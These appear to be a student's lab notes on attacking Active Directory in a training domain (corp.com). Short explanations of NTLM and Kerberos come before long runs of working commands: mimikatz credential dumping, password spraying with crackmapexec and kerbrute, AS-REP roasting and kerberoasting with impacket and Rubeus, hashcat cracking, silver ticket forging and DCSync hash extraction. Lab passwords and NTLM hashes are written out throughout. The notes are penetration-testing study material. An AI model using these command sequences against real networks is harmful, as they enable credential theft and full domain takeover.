### NTLM Authentication
- NTLM authentication is used when a client authenticates to a server by IP address (instead of by hostname)
- or if the user attempts to authenticate to a hostname that is not registered on the Active Directory-integrated DNS server
- NTLM cannot be reversed. However, it is considered a fast-hashing algorithm since short passwords can be cracked quickly
- computer calculates a cryptographic hash, called the NTLM hash, from the user's password.
- client computer sends the username to the server, which returns a random value called the nonce or challenge
- client then encrypts the nonce using the NTLM hash, now known as a response, and sends it to the server

### Kerberos
- Microsoft's primary authentication mechanism 
- unlike NTLM where the client starts the auth with the server, kerberos uses the domain controller in the role of Key Distribution center, client starts auth with the KDC
- DC responds to client with AS-REP containing a session key and a Ticket Granting Ticket
- TGT contains information regarding the user, the domain, a timestamp, the IP address of the client, and the session key
- TGT is encrypted by a secret key (NTLM hash of the krbtgt account) known only to the KDC and cannot be decrypted by the client

### Cached AD credentials
- NTLM hashes are stored in the Local Security Authority Subsystem Service (LSASS) memory space
- need SYSTEM (or local administrator) permissions to gain access to the hashes stored on a target

```
xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.214.75
```

start powershell as Administrator
```
cd C:\Tools
```

start mimikatz (we want NTLM hashes)
```
.\mimikatz.exe
```

engage the SeDebugPrivlege privilege, which will allow us to interact with a process owned by another account
```
privilege::debug
```

dump the credentials of all logged-on users
```
sekurlsa::logonpasswords

2688c6d2af5e9c7ddb268899123744ea
```

#### we can try using mimikatz to exploit Kerberos authentication by abusing TGT and service tickets

create and cache a service ticket by listing out SMB share
```
dir \\web04.corp.com\backup
```

show tickets stored in memory with mimikatz
```
sekurlsa::tickets
```

### Password attacks
- note to beware of account lockouts doing password attacks
- keep in mind Lockout threshold and Lockout observation window
```
xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.214.75
net accounts
```

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```

This password spraying tactic is already implemented in the PowerShell script C:\Tools\Spray-Passwords.ps1
```
cd C:\Tools
powershell -ep bypass
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```
### second approach for password attacking uses SMB
- can use crackmapexec for this (kali tool)
- note that it does not examine password policy
```
vi users.txt
crackmapexec smb 192.168.214.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
crackmapexec smb 192.168.214.75 -u dave -p 'Flowers1' -d corp.com
```

can also user kerbrute in powershell
```
notepad usernames.txt
type usernames.txt
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```

spray creds for pete against all machines
- show `p0wned` when local admin on the box
```
crackmapexec smb 192.168.214.70-192.168.214.76 -u pete -p 'Nexus123!' -d corp.com --continue-on-success
```

### AS-REP Roasting
- the first step of the authentication process via Kerberos is to send an AS-REQ
- if auth is successful, the domain controller replies with an AS-REP containing the session key and TGT
- if no kerberos we can send AS-REP to DC on behalf of any user and do an offline password attack
- you can achieve this by disabling kerberos preauth
```
impacket-GetNPUsers -dc-ip 192.168.214.70  -request -outputfile hashes.asreproast corp.com/pete
```

dave is in output, meaning he has preauth disabled and we can use hashcat to crack the result
```
hashcat --help | grep -i "Kerberos"
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

we can also use Rubeus on windows
```
cd C:\Tools
.\Rubeus.exe asreproast /nowrap
sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

can also identify users that don't require preauth using windows - PowerView's Get-DomainUser function with the option -PreauthNotRequired (but this doesn't give you the hashes like impacket-getNPUsers does)
```
cd C:\Tools
powershell -ep bypass
Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired
```
#### vm2
```
xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.214.75

impacket-GetNPUsers -dc-ip 192.168.214.70  -request -outputfile hashes.asreproast corp.com/jeff
sudo hashcat -m 18200 hashes.asreproast3 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### kerberoasting
- when a user wants to access a resource hosted by a Service Principal Name (SPN)
- the client requests a service ticket that is generated by the domain controller. 
- The service ticket is then decrypted and validated by the application server, 
- since it is encrypted via the password hash of the SPN
- When requesting the service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN

```
cd C:\Tools
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
copy hashes to kali 
```
hashcat --help | grep -i "Kerberos"
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
need the user's password - Nexus123!
```
sudo impacket-GetUserSPNs -request -dc-ip 192.168.214.70 corp.com/pete
```

### VM 2
```
sudo impacket-GetUserSPNs -request -dc-ip 192.168.214.70 corp.com/jeff
sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r rule1 --force
```


### Silver tickets
- we are going to forge our own service tickets
- if PAC (Privileged Attribute Certificate) is enabled, the user authenticating to the service and its privileges are validated by the domain controller
- most services do not have this enabled
- need SPN password hash, Domain SID and Target SPN to create a silver ticket

note we currently cannot access
```
iwr -UseDefaultCredentials http://web04
```

Since we are a local Administrator on this machine where iis_service has an established session, we can use Mimikatz to retrieve the SPN password hash (NTLM hash of iis_service)
```
cd C:\Tools
.\mimikatz.exe
privilege::debug
```

grab the NTLM hash of iis_service
```
sekurlsa::logonpasswords
```

now we need domain SID (remove the last number, the user id)
```
whoami /user
```

create ticket (in mimikatz)
```
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```

confirm ticket is in memory
```
klist
```

now this command should work
```
iwr -UseDefaultCredentials http://web04 -outfile outfile.txt
more outfile.txt | findstr /i OS{
```

### domain controller synchronization
- the domain controller receiving a request for an update does not check whether the request came from a known domain controller
- to launch rogue update request user needs Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights
- 
```
xfreerdp /cert-ignore /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.250.75

cd C:\Tools\
.\mimikatz.exe
```

obtain NTLM hashes
```
lsadump::dcsync /user:corp\krbtgt
lsadump::dcsync /user:corp\dave
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

perform dcsync secrets dump on kali
```
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.250.70
```

NTLM hash is in the last part - `08d7a47a6f9f66b97b1bae4178747494`
```
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
```

### VM 2
1) Perform credential roasting on specific users within the DC.
2) Crack the hash using a custom rule with hashcat.
3) Spray the new credential across all machines using crackmapexec.
4) Use mimikatz to perform post-exploitation and try logging into DC1.
### AS-REP Roasting
```
impacket-GetNPUsers -dc-ip 192.168.250.70  -request -outputfile hashes.asreproast4 corp.com/pete
sudo hashcat -m 18200 hashes.asreproast4 /usr/share/wordlists/rockyou.txt -r rule2 --force
```

rule to do ! or 1 or nothing appended
```
:
$1
$!
```

password spray against all the machines - need to use smb, will show where the user has Admins
```
crackmapexec smb 192.168.250.70-192.168.250.75 -u mike -p Darkness1099
```

log on as mike and try to get a user who has admin on DC1
```
xfreerdp /u:mike /p:Darkness1099! /cert-ignore /compression /auto-reconnect /d:corp.com /v:192.168.250.75
cd C:\Tools
.\mimikatz.exe
privilege::debug
```

grab the NTLM hash of iis_service
```
sekurlsa::logonpasswords
```

get maria NTLM on DC1 - `2a944a58d4ffa77137b2c587e6ed7626`
```
hashcat -m 1000 maria.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
xfreerdp /u:maria /p:passwordt_1415 /cert-ignore /compression /auto-reconnect /d:corp.com /v:192.168.250.70
```

### VM 3
```
crackmapexec smb 192.168.250.70-192.168.250.75 -u users2.txt -p VimForPowerShell123!

sudo impacket-GetUserSPNs -request -dc-ip 192.168.250.70 corp.com/meg
sudo hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt -r rule2 --force

xfreerdp /u:backupuser /p:DonovanJadeKnight1 /cert-ignore /compression /auto-reconnect /d:corp.com /v:192.168.250.70
```






